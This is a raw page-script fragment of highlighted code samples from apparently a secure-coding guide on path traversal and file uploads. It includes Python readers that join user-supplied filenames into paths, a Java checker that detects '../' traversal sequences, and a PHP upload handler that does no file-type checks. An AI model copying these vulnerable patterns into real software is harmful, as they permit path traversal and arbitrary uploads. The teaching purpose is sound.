string\"\u003e\"\u0026lt;\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$profilePath\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e ExitError\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"profile read error: $profilePath\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\u0026lt;ul\u003e\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$fh\u003c/span\u003e\u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\u0026lt;li\u003e$_\u0026lt;/li\u003e\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\u0026lt;/ul\u003e\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"27:T77d,\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e os\n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e sys\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003emain\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    filename \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e sys\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eargv\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n    path \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e os\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ejoin\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eos\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003egetcwd\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e filename\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eopen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'r'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eas\u003c/span\u003e f\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            file_data \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e f\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eread\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e FileNotFoundError \u003cspan class=\"token keyword\"\u003eas\u003c/span\u003e    e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Error - file not found\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nmain\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n28:T967,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e os\n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e sys\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003emain\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    filename \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e sys\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eargv\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n    path \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e os\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003enormpath\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003eos\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003egetcwd\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003eos\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esep\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003efilename\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eopen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'r'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eas\u003c/span\u003e f\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            file_data \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e f\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eread\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e FileNotFoundError \u003cspan class=\"token keyword\"\u003eas\u003c/span\u003e    e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Error - file not found\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nmain\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"29:T628,public class PathTraversalChecker {\n\n    /**\n     * Checks the entry name for path traversal vulnerable sequences.\n     *\n     * This code is used for path traversal, ZipSlip and TarSlip detection.\n     *\n     * \u003cb\u003eIMPLEMENTATION NOTE\u003c/b\u003e\n     * We do it this way instead of the way recommended in \u003ca href=\"https://snyk.io/research/zip-slip-vulnerability\"\u003e\u003c/a\u003e\n     * for performance reasons, calling {@link File#getCanonicalPath()} is too expensive.\n     *\n     * @throws IllegalArgumentException if the entry contains vulnerable sequences\n     */\n    public static String safePathName(String name) {\n        if (isUnsafePathName(name)) {\n            throw new IllegalArgumentException(format(\"'%s' is not a safe archive entry or path name.\", name));\n        }\n        return name;\n    }\n\n    public static boolean isUnsafePathName(String name) {\n        return name.isEmpty()\n            || name.startsWith(\"/\")\n            || name.startsWith(\"\\\\\")\n            || containsDirectoryNavigation(name)\n            || (name.contains(\":\") \u0026\u0026 isWindows());\n    }\n\n    private static boolean containsDirectoryNavigation(String name) {\n        if (!name.contains(\"..\")) {\n            return false;\n        }\n        // We have a .. but if not before a file separator or at the end, it is OK\n        return name.endsWith(\"\\\\..\")\n            || name.contains(\"..\\\\\")\n            || name.endsWith(\"/..\")\n            || name.contains(\"../\");\n    }\n\n    private static boolean isWindows() {\n        return System.getProperty(\"os.name\").toLowerCase(Locale.US).contains(\"windows\");\n    }\n}\n2a:T1d03,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003epublic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"token class-name\"\u003ePathTraversalChecker\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n\n    \u003cspan class=\"token comment\"\u003e/**\n     * Checks the entry name for path traversal vulnerable sequences.\n     *\n     * This code is used for path traversal, ZipSlip and TarSlip detection.\n     *\n     * \u0026lt;b\u003eIMPLEMENTATION NOTE\u0026lt;/b\u003e\n     * We do it this way instead of the way recommended in \u0026lt;a href=\"https://snyk.io/research/zip-slip-vulnerability\"\u003e\u0026lt;/a\u003e\n     * for performance reasons, calling {@link File#getCanonicalPath()} is too expensive.\n     *\n     * @throws IllegalArgumentException if the entry contains vulnerable sequences\n     */\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003epublic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003estatic\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e \u003cspan class=\"token function\"\u003esafePathName\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003eisUnsafePathName\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ename\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ethrow\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eIllegalArgumentException\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003eformat\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"'%s' is not a safe archive entry or path name.\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003epublic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003estatic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eboolean\u003c/span\u003e \u003cspan class=\"token function\"\u003eisUnsafePathName\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eisEmpty\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estartsWith\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estartsWith\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\\\\\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token function\"\u003econtainsDirectoryNavigation\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ename\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ename\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003econtains\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\":\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"token function\"\u003eisWindows\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eprivate\u003c/span\u003e \u003cspan class=\"token keyword\"\u003estatic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eboolean\u003c/span\u003e \u003cspan class=\"token function\"\u003econtainsDirectoryNavigation\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003ename\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003econtains\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"..\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003efalse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e// We have a .. but if not before a file separator or at the end, it is OK\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eendsWith\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\\\\..\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003econtains\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"..\\\\\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eendsWith\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/..\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003econtains\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"../\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eprivate\u003c/span\u003e \u003cspan class=\"token keyword\"\u003estatic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eboolean\u003c/span\u003e \u003cspan class=\"token function\"\u003eisWindows\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eSystem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003egetProperty\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"os.name\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eLocale\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token constant\"\u003eUS\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003econtains\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"windows\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2b:Ta0a,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eform\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eaction\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003eupload_picture.php\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003emethod\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003epost\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eenctype\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003emultipart/form-data\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    Choose a file to upload:\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003einput\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003etype\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003efile\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ename\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003efilename\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e/\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e/\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003einput\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003etype\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003esubmit\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ename\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003esubmit\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003evalue\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003eSubmit\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e/\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eform\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2c:T8ed,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token comment\"\u003e//upload_picture.php\u003c/span\u003e\n\u003cspan class=\"token operator\"\u003e...\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// Define the target location where the picture being\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// uploaded is going to be saved.\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$target\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"pictures/\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e.\u003c/span\u003e \u003cspan class=\"token function\"\u003ebasename\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'uploadedfile'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// Move the uploaded file to the new location.\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003emove_uploaded_file\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'uploadedfile'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'tmp_name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$target\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eecho\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"The picture has been successfully uploaded.\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eecho\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"There was an error uploading the picture, please try again.\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2d:T1a9a,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eisset\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'submit'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e//Check if the file is JPG, PNG or GIF.\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003ein_array\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'imagefile'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token 